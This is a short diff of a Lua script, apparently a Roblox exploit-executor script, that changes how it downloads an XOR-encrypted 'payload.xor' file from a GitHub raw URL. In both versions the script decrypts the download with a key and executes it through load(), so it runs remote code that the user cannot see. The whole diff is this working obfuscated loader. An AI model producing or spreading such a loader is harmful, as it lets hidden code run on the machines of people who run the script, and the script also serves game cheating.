@@ -12,14 +12,17 @@ end
 
 local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"
 
-local success, encrypted = pcall(function()
-    return game:HttpGet(url, true)
+local success, response = pcall(function()
+    return syn.request({
+        Url = url,
+        Method = "GET"
+    }).Body
 end)
 
 if not success then
-    warn("HttpGet selhalo: " .. tostring(encrypted))
+    warn("syn.request selhalo: " .. tostring(response))
     return
 end
 
-local decoded = decrypt(encrypted, key)
+local decoded = decrypt(response, key)
 load(decoded)()
